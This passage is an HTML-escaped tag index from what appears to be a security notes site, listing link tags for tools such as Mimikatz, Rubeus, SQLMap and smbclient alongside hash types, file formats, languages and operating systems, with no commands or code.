data-slug=&quot;tags/Application/PostgreSQL&quot;&gt;Application/PostgreSQL&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/PowerShell&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/PowerShell&quot;&gt;Application/PowerShell&lt;/a&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/PowerShell/Invoke-Kerberoast&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/PowerShell/Invoke-Kerberoast&quot;&gt;Application/PowerShell/Invoke-Kerberoast&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/PowerShell/Invoke-Mimikatz&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/PowerShell/Invoke-Mimikatz&quot;&gt;Application/PowerShell/Invoke-Mimikatz&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/PowerShell/Powercat&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/PowerShell/Powercat&quot;&gt;Application/PowerShell/Powercat&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/PowerShell/PowerUp&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/PowerShell/PowerUp&quot;&gt;Application/PowerShell/PowerUp&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/PowerShell/PowerView&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/PowerShell/PowerView&quot;&gt;Application/PowerShell/PowerView&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/ProcMon&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/ProcMon&quot;&gt;Application/ProcMon&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/proxychains&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/proxychains&quot;&gt;Application/proxychains&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/ps&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/ps&quot;&gt;Application/ps&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/PsExec&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/PsExec&quot;&gt;Application/PsExec&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/psk-crack&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/psk-crack&quot;&gt;Application/psk-crack&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/query&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/query&quot;&gt;Application/query&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/readlink&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/readlink&quot;&gt;Application/readlink&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/reg&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/reg&quot;&gt;Application/reg&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/rlwrap&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/rlwrap&quot;&gt;Application/rlwrap&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/RogueWinRM&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/RogueWinRM&quot;&gt;Application/RogueWinRM&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/rpm&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/rpm&quot;&gt;Application/rpm&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/Rubeus&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/Rubeus&quot;&gt;Application/Rubeus&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/RunAs&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/RunAs&quot;&gt;Application/RunAs&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/SamsungDeX&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/SamsungDeX&quot;&gt;Application/SamsungDeX&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/SDelete&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/SDelete&quot;&gt;Application/SDelete&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/secedit&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/secedit&quot;&gt;Application/secedit&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/sed&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/sed&quot;&gt;Application/sed&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/select&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/select&quot;&gt;Application/select&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/Shortcuts&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/Shortcuts&quot;&gt;Application/Shortcuts&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/shutdown&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/shutdown&quot;&gt;Application/shutdown&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/sidguess&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/sidguess&quot;&gt;Application/sidguess&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/sleep&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/sleep&quot;&gt;Application/sleep&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/smbclient&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/smbclient&quot;&gt;Application/smbclient&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/smbget&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/smbget&quot;&gt;Application/smbget&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/smbmap&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/smbmap&quot;&gt;Application/smbmap&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/socat&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/socat&quot;&gt;Application/socat&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/SQLMap&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/SQLMap&quot;&gt;Application/SQLMap&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/ss&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/ss&quot;&gt;Application/ss&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/SSH&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/SSH&quot;&gt;Application/SSH&lt;/a&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/SSH/Dropbear&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/SSH/Dropbear&quot;&gt;Application/SSH/Dropbear&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/sudo&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/sudo&quot;&gt;Application/sudo&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/systemctl&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/systemctl&quot;&gt;Application/systemctl&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/systeminfo&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/systeminfo&quot;&gt;Application/systeminfo&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/takeown&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/takeown&quot;&gt;Application/takeown&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/tar&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/tar&quot;&gt;Application/tar&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/tcpdump&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/tcpdump&quot;&gt;Application/tcpdump&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/tee&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/tee&quot;&gt;Application/tee&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/telnet&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/telnet&quot;&gt;Application/telnet&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/TheHarvester&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/TheHarvester&quot;&gt;Application/TheHarvester&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/timeout&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/timeout&quot;&gt;Application/timeout&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/tmux&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/tmux&quot;&gt;Application/tmux&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/tnscmd10g&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/tnscmd10g&quot;&gt;Application/tnscmd10g&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/traceroute&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/traceroute&quot;&gt;Application/traceroute&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/tracert&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/tracert&quot;&gt;Application/tracert&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/type&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/type&quot;&gt;Application/type&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/unbuffer&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/unbuffer&quot;&gt;Application/unbuffer&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/ViM&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/ViM&quot;&gt;Application/ViM&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/VirtualBox&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/VirtualBox&quot;&gt;Application/VirtualBox&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/wfuzz&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/wfuzz&quot;&gt;Application/wfuzz&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/wget&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/wget&quot;&gt;Application/wget&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/whoami&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/whoami&quot;&gt;Application/whoami&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/WindowsExploitSuggester&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/WindowsExploitSuggester&quot;&gt;Application/WindowsExploitSuggester&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/windump&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/windump&quot;&gt;Application/windump&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/WinPEAS&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/WinPEAS&quot;&gt;Application/WinPEAS&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/winrs&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/winrs&quot;&gt;Application/winrs&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/Wireshark&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/Wireshark&quot;&gt;Application/Wireshark&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/wmic&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/wmic&quot;&gt;Application/wmic&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/Word&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/Word&quot;&gt;Application/Word&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/XFreeRDP&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/XFreeRDP&quot;&gt;Application/XFreeRDP&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/Xterm&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/Xterm&quot;&gt;Application/Xterm&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/xxd&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/xxd&quot;&gt;Application/xxd&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Application/youtube-dl&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Application/youtube-dl&quot;&gt;Application/youtube-dl&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Cloud&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Cloud&quot;&gt;Cloud&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Cloud/AWS&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Cloud/AWS&quot;&gt;Cloud/AWS&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Cryptography&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Cryptography&quot;&gt;Cryptography&lt;/a&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Cryptography/Cryptosystems&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Cryptography/Cryptosystems&quot;&gt;Cryptography/Cryptosystems&lt;/a&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Cryptography/Cryptosystems/RSA&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Cryptography/Cryptosystems/RSA&quot;&gt;Cryptography/Cryptosystems/RSA&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Cryptography/Hashes&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Cryptography/Hashes&quot;&gt;Cryptography/Hashes&lt;/a&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Cryptography/Hashes/AS-REP&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Cryptography/Hashes/AS-REP&quot;&gt;Cryptography/Hashes/AS-REP&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Cryptography/Hashes/bcrypt&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Cryptography/Hashes/bcrypt&quot;&gt;Cryptography/Hashes/bcrypt&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Cryptography/Hashes/LANMAN&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Cryptography/Hashes/LANMAN&quot;&gt;Cryptography/Hashes/LANMAN&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Cryptography/Hashes/MD4&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Cryptography/Hashes/MD4&quot;&gt;Cryptography/Hashes/MD4&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Cryptography/Hashes/MD5&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Cryptography/Hashes/MD5&quot;&gt;Cryptography/Hashes/MD5&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Cryptography/Hashes/NT&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Cryptography/Hashes/NT&quot;&gt;Cryptography/Hashes/NT&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Cryptography/Hashes/SHA1&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Cryptography/Hashes/SHA1&quot;&gt;Cryptography/Hashes/SHA1&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Cryptography/Hashes/SHA256&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Cryptography/Hashes/SHA256&quot;&gt;Cryptography/Hashes/SHA256&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Cryptography/Hashes/SHA512&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Cryptography/Hashes/SHA512&quot;&gt;Cryptography/Hashes/SHA512&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Cryptography/Hashes/TGS-REP&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Cryptography/Hashes/TGS-REP&quot;&gt;Cryptography/Hashes/TGS-REP&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Cryptography/Signatures&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Cryptography/Signatures&quot;&gt;Cryptography/Signatures&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/FileFormat&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/FileFormat&quot;&gt;FileFormat&lt;/a&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/FileFormat/Gemtext&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/FileFormat/Gemtext&quot;&gt;FileFormat/Gemtext&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/FileFormat/GIF&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/FileFormat/GIF&quot;&gt;FileFormat/GIF&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/FileFormat/HTA&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/FileFormat/HTA&quot;&gt;FileFormat/HTA&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/FileFormat/HTML&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/FileFormat/HTML&quot;&gt;FileFormat/HTML&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/FileFormat/JSON&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/FileFormat/JSON&quot;&gt;FileFormat/JSON&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/FileFormat/kirbi&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/FileFormat/kirbi&quot;&gt;FileFormat/kirbi&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/FileFormat/M4A&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/FileFormat/M4A&quot;&gt;FileFormat/M4A&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/FileFormat/Markdown&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/FileFormat/Markdown&quot;&gt;FileFormat/Markdown&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/FileFormat/MP3&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/FileFormat/MP3&quot;&gt;FileFormat/MP3&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/FileFormat/MP4&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/FileFormat/MP4&quot;&gt;FileFormat/MP4&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/FileFormat/VBS&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/FileFormat/VBS&quot;&gt;FileFormat/VBS&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/FileFormat/WebP&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/FileFormat/WebP&quot;&gt;FileFormat/WebP&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/FileFormat/XML&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/FileFormat/XML&quot;&gt;FileFormat/XML&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/FileFormat/XMP&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/FileFormat/XMP&quot;&gt;FileFormat/XMP&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Hardware&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Hardware&quot;&gt;Hardware&lt;/a&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Hardware/iPadPro&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Hardware/iPadPro&quot;&gt;Hardware/iPadPro&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Hardware/Kobo&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Hardware/Kobo&quot;&gt;Hardware/Kobo&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Hardware/MACAddress&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Hardware/MACAddress&quot;&gt;Hardware/MACAddress&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Hardware/RaspberryPi&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Hardware/RaspberryPi&quot;&gt;Hardware/RaspberryPi&lt;/a&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Hardware/RaspberryPi/4B&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Hardware/RaspberryPi/4B&quot;&gt;Hardware/RaspberryPi/4B&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Language&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Language&quot;&gt;Language&lt;/a&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Language/Bash&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Language/Bash&quot;&gt;Language/Bash&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Language/Java&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Language/Java&quot;&gt;Language/Java&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Language/JavaScript&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Language/JavaScript&quot;&gt;Language/JavaScript&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Language/Perl&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Language/Perl&quot;&gt;Language/Perl&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Language/PHP&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Language/PHP&quot;&gt;Language/PHP&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Language/Python&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Language/Python&quot;&gt;Language/Python&lt;/a&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Language/Python/Scapy&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Language/Python/Scapy&quot;&gt;Language/Python/Scapy&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Language/Ruby&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Language/Ruby&quot;&gt;Language/Ruby&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Language/SQL&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Language/SQL&quot;&gt;Language/SQL&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Language/VisualBasic&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Language/VisualBasic&quot;&gt;Language/VisualBasic&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/OS&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/OS&quot;&gt;OS&lt;/a&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/OS/AIX&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/OS/AIX&quot;&gt;OS/AIX&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/OS/Android&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/OS/Android&quot;&gt;OS/Android&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/OS/CiscoIOS&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/OS/CiscoIOS&quot;&gt;OS/CiscoIOS&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/OS/iOS&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/OS/iOS&quot;&gt;OS/iOS&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/OS/Linux&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/OS/Linux&quot;&gt;OS/Linux&lt;/a&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/OS/Linux/Distros&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/OS/Linux/Distros&quot;&gt;OS/Linux/Distros&lt;/a&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/OS/Linux/Distros/Debian&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/OS/Linux/Distros/Debian&quot;&gt;OS/Linux/Distros/Debian&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/OS/Linux/Distros/Kali&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/OS/Linux/Distros/Kali&quot;&gt;OS/Linux/Distros/Kali&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/OS/Linux/Distros/RedHat&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/OS/Linux/Distros/RedHat&quot;&gt;OS/Linux/Distros/RedHat&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/OS/Linux/Permissions&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/OS/Linux/Permissions&quot;&gt;OS/Linux/Permissions&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/OS/Linux/Polkit&quot; 